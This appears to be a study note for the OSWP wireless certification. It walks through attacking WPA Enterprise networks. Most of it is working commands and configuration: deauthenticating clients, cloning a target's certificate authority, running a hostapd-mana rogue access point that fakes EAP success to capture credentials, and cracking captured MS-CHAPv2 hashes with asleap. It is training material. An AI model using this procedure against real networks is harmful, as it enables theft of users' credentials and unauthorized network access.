---
{"dg-publish":true,"permalink":"/OSWP/g. Enterprise Cracking/"}
---

-------------
### Theory
- Authentication is done using a RADIUS server
- EAP frames are relayed from AP to RADIUS, if successful a PMK is used in a 4-way handshake
- Authentication methods:
	- EAP-TLS
		- One of the most secure
		- Certificates on both server and client side
	- EAP-TTLS
		- Does not necessarily need client certificates
		- Creates a tunnel to exchange credentials using different inner/phase2 methods
			- Challenge-Handshake Authentication Protocol (CHAP)
			- Authentication Protocol (PAP)
			- Microsoft CHAP (MS-CHAP)
			- MS-CHAPv2
	- PEAP
		- TLS tunnel with most commonly MS-CHAPv2
- AUTH: MGT means WPA Enterprise

### Walkthrough:
1. Generate/validate certificate:
```
openssl x509 -in <name.crt/pem> -noout -enddate
```
2. Sniff nearby APs:
```
sudo airodump-ng wlan0mon
```
3. Tune dump with channel and SSIDs:
```
sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
```
4. Start deauth:
```
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
```
5. Open capture in Wireshark and filter for:
```
tls.handshake.certificate
```
6. _Extensible Authentication Protocol_ > _Transport Layer Security_
7. Find the certificates and right-click for "Export Packet Bytes"
8. Convert the .der into a .crt:
```
openssl x509 -inform der -in <file.der> -outform pem -out <file.crt>
```
9. Edit [certificate_authority] in freeradius to match target CA:
```
sudo nano /etc/freeradius/3.0/certs/ca.cnf
```
Example:
```
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...
```
10. Edit [server] in freeradius to match target CA:
```
sudo nano /etc/freeradius/3.0/certs/server.cnf
```
Example:
```
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```
11. Delete the diffie-hellman file and any previous certs and make the cert:
```
make destroycerts
sudo rm /etc/freeradius/3.0/certs/dh
make
```
12. Generate the mana.conf file and set SSID:
```
# SSID of the AP
ssid=<ssid-name>

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
13. Create the EAP user file referenced in the conf-file:
```
sudo nano /etc/hostapd-mana/mana.eap_user
```
Paste:
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
14. Start hostapd-mana with the conf-file:
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
15. Catch credentials in: /tmp/hostapd.credout
16. Crack with asleap:
```
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
```